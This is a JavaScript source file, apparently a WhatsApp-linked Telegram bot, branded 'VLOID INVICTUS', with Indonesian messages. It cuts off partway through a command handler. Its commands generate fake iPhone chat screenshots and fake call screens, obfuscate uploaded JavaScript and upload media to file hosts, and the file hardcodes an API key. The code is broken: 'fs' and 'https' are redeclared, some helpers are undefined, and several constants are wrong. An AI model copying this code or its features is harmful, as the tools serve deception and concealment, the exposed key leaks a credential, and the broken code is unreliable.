const fs = require("fs");
const https = require("https");
const { exec } = require("child_process");
const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { BOT_TOKEN, ownerID, OWNER_ID } = require("./settings/config");
const commandLock = new Map()
const welcomeMessage = new Map() 
const goodbyeMessage = new Map() 
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const thumbnailUrl = "https://files.catbox.moe/wn88u6.jpg";

const thumbnailVideo = "https://files.catbox.moe/jv67yv.mp4";

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/agungdermawan22332-sys/NewEra/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const res = await axios.get(GITHUB_TOKEN_LIST_URL, {
      timeout: 5000,
      validateStatus: s => s === 200
    });

    if (
      !res.data ||
      typeof res.data !== "object" ||
      !Array.isArray(res.data.tokens)
    ) {
      throw new Error("DATABASE TOKEN TIDAK VALID");
    }

    const tokens = res.data.tokens.filter(
      t => typeof t === "string" && t.length > 10
    );

    if (tokens.length === 0) {
      throw new Error("DATABASE TOKEN KOSONG");
    }

    console.log(chalk.green("✅ Database token valid"));
    return tokens;

  } catch (e) {
    console.error(chalk.red("❌ GAGAL MENGAKSES DATABASE TOKEN"));
    console.error(chalk.red(e.message));
    return null;
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token...\n"));

  if (!BOT_TOKEN || typeof BOT_TOKEN !== "string") {
    console.error(chalk.red("❌ TOKEN TIDAK DISET / INVALID"));
    return false;
  }

  const tokens = await fetchValidTokens();
  if (!tokens) return false;

  if (!tokens.includes(BOT_TOKEN.trim())) {
    console.log(chalk.red(`
═════════════════════
⛔ TOKEN TIDAK TERDAFTAR
═════════════════════
AKSES DITOLAK
`));
    return false;
  }

  console.log(chalk.green("✅ TOKEN VALID\n"));
  return true;
}

function startBot() {
  console.log(chalk.white(`
» Information:
☇ Developer : Xata
☇ Script    : NULL
☇ Version   : 1.0
`));
}

(async () => {
  const isValid = await validateToken();
  if (!isValid) return; 
  startBot();
})();

validateToken();

const bot = new Telegraf(BOT_TOKEN);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const adminFile = './database/admin.json';

const loadAdmins = () => {
  try {
      const data = fs.readFileSync(adminFile);
      return JSON.parse(data);
  } catch (err) {
      return {};
  }
};

const saveAdmins = (admins) => {
  try {
      fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
  } catch (err) {
  }
};

const addAdmin = (userId) => {
  const admins = loadAdmins();
  admins[userId] = true;
  saveAdmins(admins);
  return true;
};

const removeAdmin = (userId) => {
  const admins = loadAdmins();
  delete admins[userId];
  saveAdmins(admins);
  return true;
};

const isAdmin = (userId) => {
  const admins = loadAdmins();
  return admins[userId] === true || userId == ownerID;
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.green(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀


 ⌑ Protection ACTIVE 🛡️
 ⌑ Xatanicall Server 🌐
 ⌑ Status Sender : Terhubung
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ VLOID INVICTUS ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "VLOID111");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⬡═―—⊱ ⎧ VLOID INVICTUS ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⬡═―—⊱ ⎧ VLOID INVICTUS ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};
    
    
bot.command('addadmin', async (ctx) => {
  if (ctx.from.id != ownerID) {
      return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }
  
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
  }
  
  const userId = args[1];
  addAdmin(userId);
  ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
  if (ctx.from.id != ownerID) {
      return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }
  
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
  }
  
  const userId = args[1];
  if (userId == ownerID) {
      return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
  }
  
  removeAdmin(userId);
  ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

//MD MENU
bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});



const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

// ================== GROUP ONLY CORE ==================
let groupOnlyMode = false;

// Middleware khusus /start
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next();

  const isPrivate = ctx.chat.type === "private";
  const isStart = ctx.message.text.startsWith("/start");

  if (groupOnlyMode && isPrivate && isStart) {
    return ctx.reply("🚫 Bot hanya bisa digunakan di GRUP.");
  }

  return next();
});

bot.command("grouponly", async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ Khusus admin script.");
  }

  const arg = ctx.message.text.split(" ")[1];
  if (!arg) {
    return ctx.reply("❌ Gunakan: /grouponly on | off");
  }

  if (arg === "on") {
    groupOnlyMode = true;
    return ctx.reply(
      "✅ GROUP ONLY diaktifkan.\n" +
      "🚫 /start di private chat diblok."
    );
  }

  if (arg === "off") {
    groupOnlyMode = false;
    return ctx.reply(
      "❎ GROUP ONLY dimatikan.\n" +
      "✅ /start di private chat dibuka."
    );
  }

  ctx.reply("❌ Gunakan: /grouponly on | off");
});

bot.use(async (ctx, next) => {
  if (
    groupOnlyMode &&
    ctx.chat?.type === "private" &&
    ctx.message?.text === "/start"
  ) {
    return ctx.reply(
      "🚫 Bot hanya bisa digunakan di GROUP.\n" +
      "Hubungi admin jika perlu akses."
    );
  }

  return next();
});

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
